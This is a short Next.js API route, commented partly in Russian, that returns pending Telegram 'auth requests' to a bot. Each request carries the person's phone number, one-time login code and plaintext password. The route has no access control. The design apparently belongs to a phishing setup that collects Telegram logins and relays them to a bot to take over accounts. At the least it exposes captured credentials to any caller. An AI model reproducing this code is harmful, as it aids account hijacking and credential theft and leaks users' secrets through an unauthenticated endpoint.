import { NextResponse } from "next/server"
import { getPendingAuthRequests } from "@/lib/auth-store"

// GET /api/telegram/get-pending - Получить необработанные запросы (для бота)
export async function GET() {
  try {
    const pendingRequests = getPendingAuthRequests()

    console.log(`[API] Returning ${pendingRequests.length} pending requests`)

    return NextResponse.json({
      success: true,
      requests: pendingRequests.map((req) => ({
        requestId: req.requestId,
        action: req.action,
        phone: req.phone,
        code: req.code,
        password: req.password,
        chatId: req.chatId,
        telegramId: req.telegramId, // Include telegramId for session tracking
        timestamp: new Date(req.timestamp).toISOString(),
        processed: req.processed,
        status: req.status,
      })),
    })
  } catch (error) {
    console.error("[API] Error getting pending requests:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
